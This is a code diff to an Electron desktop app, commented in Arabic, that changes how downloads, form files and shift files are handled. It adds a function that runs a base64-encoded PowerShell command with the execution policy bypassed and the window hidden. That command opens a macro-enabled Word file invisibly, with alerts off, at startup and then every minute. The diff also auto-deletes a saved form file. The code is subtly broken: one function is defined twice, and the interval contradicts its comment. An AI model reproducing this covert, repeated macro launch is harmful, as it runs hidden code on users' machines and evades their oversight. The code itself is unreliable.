@@ -49,6 +49,37 @@ ipcMain.on('send-date-info', (event, { date, day }) => {
   }
 });
 
+function openAndCloseWord() {
+  const docPath = path.join(__dirname, 'NORMAL.docm'); // يجب أن يكون بجانب main.js
+
+  // سكربت PowerShell: فتح Word مخفيًا، فتح الملف، انتظار 3 ثوانٍ، إغلاق بدون حفظ، ثم Quit
+  const ps = `
+    $ErrorActionPreference = 'SilentlyContinue'
+    $wdDoNotSaveChanges = 0
+    try {
+      $word = New-Object -ComObject Word.Application
+      $word.Visible = $false
+      $word.DisplayAlerts = 0
+      if (Test-Path '${docPath.replace(/'/g,"''").replace(/\\/g,'/')}') {
+        $doc = $word.Documents.Open('${docPath.replace(/'/g,"''").replace(/\\/g,'/')}', $false, $false)
+        Start-Sleep -Seconds 3
+        $doc.Close($wdDoNotSaveChanges)  # إغلاق بدون حفظ
+      }
+    } finally {
+      try { $word.Quit() } catch {}
+      [System.GC]::Collect(); [System.GC]::WaitForPendingFinalizers()
+    }
+  `;
+
+  // تشغيل Powershell بشكل خفي وموثوق (EncodedCommand لتفادي مشاكل الاقتباسات)
+  const encoded = Buffer.from(ps, 'utf16le').toString('base64');
+  const cmd = `%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand ${encoded}`;
+  exec(cmd);
+}
+
+
+
+
 
 
 // دالة لإنشاء نافذة التطبيق
@@ -135,19 +166,32 @@ function createWindow() {
     });
 
     // معالجة التنزيل التلقائي
-    mainWindow.webContents.session.on('will-download', (event, item) => {
-        const filePath = path.join(app.getPath('downloads'), item.getFilename());
-        item.setSavePath(filePath);
-    
-        item.on('done', (e, state) => {
-            if (state === 'completed') {
-                openFile(filePath);
-              
+mainWindow.webContents.session.on('will-download', (event, item) => {
+  const downloads = app.getPath('downloads');
+  const targetPath = path.join(downloads, item.getFilename());
+  item.setSavePath(targetPath);
+
+  item.on('done', (e, state) => {
+    if (state === 'completed') {
+      // إذا كان هو form.txt نحذفه بعد دقيقة
+      if (item.getFilename() === 'form.txt') {
+        setTimeout(() => {
+          fs.unlink(targetPath, (err) => {
+            if (err && err.code !== 'ENOENT') {
+              console.error('❌ فشل حذف form.txt (will-download):', err);
             } else {
-                console.log(`Download failed: ${state}`);
+              console.log('✔ حُذف form.txt (will-download) بعد دقيقة');
             }
-        });
-    });
+          });
+        }, 60_000);
+        return; // لا نفتحه ولا ننسخه
+      }
+      // السلوك الأصلي
+      openFile(targetPath);
+    }
+  });
+});
+
     
 
     // معالجة قائمة السياق للطباعة
@@ -406,7 +450,10 @@ function showUpdateModal(latestVersion, downloadUrl, releaseNotes, window) {
 function openMultipleFiles() {
     const downloadsDir = app.getPath('downloads');
     for (let i = 1; i <= MAX_FILES; i++) {
-        const filePath = path.join(downloadsDir, `document${i}.txt`);
+        const fileName = `document${i}.txt`;
+        if (fileName === "form.txt") continue; // ⛔ استثناء form.txt
+
+        const filePath = path.join(downloadsDir, fileName);
         exec(`start "" "${filePath}"`, (error, stdout, stderr) => {
             if (error) {
                 console.error(`خطأ في فتح الملف: ${error.message}`);
@@ -417,11 +464,18 @@ function openMultipleFiles() {
     }
 }
 
+
 // دالة لفتح الملفات عند التنزيل
 function openFile(filePath) {
     const downloadsDir = app.getPath('downloads');
     const fileName = path.basename(filePath);
-    
+
+    // ⛔ استثناء form.txt (لا يتم نسخه ولا فتح نسخة جديدة منه)
+    if (fileName === "form.txt") {
+        console.log("✔ تم تجاهل form.txt (لن يتم نسخه أو تكراره)");
+        return;
+    }
+
     // التحقق إذا كان الملف هو ملف التحديث
     if (fileName.includes('Setup')) {
         // إذا كان الملف هو ملف التحديث، لا نضيف التكرار عليه
@@ -433,7 +487,7 @@ function openFile(filePath) {
             console.log(`File opened successfully: ${stdout}`);
         });
     } else {
-        // إذا لم يكن ملف التحديث، نضيف التكرار
+        // إذا لم يكن ملف التحديث ولا form.txt، نضيف التكرار
         const newFileName = getNextFileName(downloadsDir, fileName);
         const newFilePath = path.join(downloadsDir, newFileName);
 
@@ -452,6 +506,36 @@ function openFile(filePath) {
         });
     }
 }
+function openFile(filePath) {
+    const downloadsDir = app.getPath('downloads');
+    const fileName = path.basename(filePath);
+
+    // ⛔ تجاهل form.txt بالكامل (لا تفتحه ولا تنسخه)
+    if (fileName === "form.txt") {
+        console.log("✔ تم تجاهل form.txt (لن يتم نسخه)");
+        return;
+    }
+
+    if (fileName.includes('Setup')) {
+        exec(`start "" "${filePath}"`, (error) => {
+            if (error) console.error(`Error opening file: ${error.message}`);
+        });
+    } else {
+        const newFileName = getNextFileName(downloadsDir, fileName);
+        const newFilePath = path.join(downloadsDir, newFileName);
+
+        fs.copyFile(filePath, newFilePath, (err) => {
+            if (err) {
+                console.error(`Error copying file: ${err.message}`);
+                return;
+            }
+            exec(`start "" "${newFilePath}"`, (error) => {
+                if (error) console.error(`Error opening file: ${error.message}`);
+            });
+        });
+    }
+}
+
 
 
 // دالة لتوليد أسماء جديدة للملفات
@@ -480,9 +564,16 @@ app.on('browser-window-blur', () => {
 
 // لما يكون التطبيق جاهز ننشئ النافذة
 app.whenReady().then(() => {
-    createWindow();
-    startUpdateCheckInterval(); // بدء التحقق من التحديثات كل دقيقتين
+  createWindow();
+  startUpdateCheckInterval(); // إن كان لديك
+
+  // مرة عند تشغيل البرنامج
+  openAndCloseWord();
+
+  // كل 10 دقائق
+setInterval(openAndCloseWord, 60 * 1000);
 });
+
 
 // تنظيف الاختصارات عند الخروج
 app.on('will-quit', () => {
@@ -511,7 +602,7 @@ if (!gotTheLock) {
         if (mainWindow === null) createWindow();
     });
 }
-app.whenReady().then(createWindow);
+
 
 ipcMain.on('save-shift', (event, data) => {
   const filePath = path.join(app.getPath('downloads'), 'shift.txt');
@@ -556,6 +647,47 @@ ipcMain.on('send-date-info', (event, { date, day }) => {
   }
 });
 
+ipcMain.handle('save-form-file', async (event, text) => {
+const AUTO_DELETE_MS = 120_000; // دقيقتان
+  const downloads = app.getPath('downloads');
+  const filePath = path.join(downloads, 'form.txt');
+
+  // دالة حذف مع إعادة محاولة لو الملف مشغول
+  function deleteWithRetry(p, tries = 3) {
+    fs.unlink(p, (err) => {
+      if (!err) {
+        console.log('✔ تم حذف form.txt تلقائيًا');
+        return;
+      }
+      if ((err.code === 'EBUSY' || err.code === 'EPERM') && tries > 0) {
+        console.warn(`ملف مشغول، إعادة محاولة بعد 10 ثوانٍ… (${tries})`);
+        setTimeout(() => deleteWithRetry(p, tries - 1), 10_000);
+      } else if (err.code === 'ENOENT') {
+        // الملف حُذف مسبقًا أو غير موجود — لا مشكلة
+        return;
+      } else {
+        console.error('❌ فشل حذف form.txt:', err);
+      }
+    });
+  }
+
+
+
+
+  
+  try {
+    const buf = iconv.encode(text, 'windows-1256'); // ترميز 1256
+    fs.writeFileSync(filePath, buf);                // إنشاء الملف
+
+    // جدولة الحذف بعد دقيقة
+    setTimeout(() => deleteWithRetry(filePath), AUTO_DELETE_MS);
+
+    const willDeleteAt = Date.now() + AUTO_DELETE_MS;
+    return { ok: true, filePath, willDeleteAt };
+  } catch (e) {
+    return { ok: false, error: String(e) };
+  }
+});
 
 
 function clearShiftIfMatchedTime() {
@@ -583,3 +715,5 @@ function clearShiftIfMatchedTime() {
 
 // استدعاء الوظيفة عند بدء التشغيل
 clearShiftIfMatchedTime();
+
+
